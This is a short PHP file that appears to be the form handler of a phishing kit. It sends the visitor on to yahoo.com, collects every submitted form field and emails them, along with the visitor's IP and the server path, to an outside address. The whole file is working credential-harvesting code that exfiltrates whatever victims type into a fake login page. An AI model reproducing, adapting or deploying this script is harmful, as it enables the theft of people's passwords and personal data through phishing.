<?php
$ip = getenv("REMOTE_ADDR"); {
header('Location: https://www.yahoo.com/');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Dear Billy'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('depsuu@msize.space', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>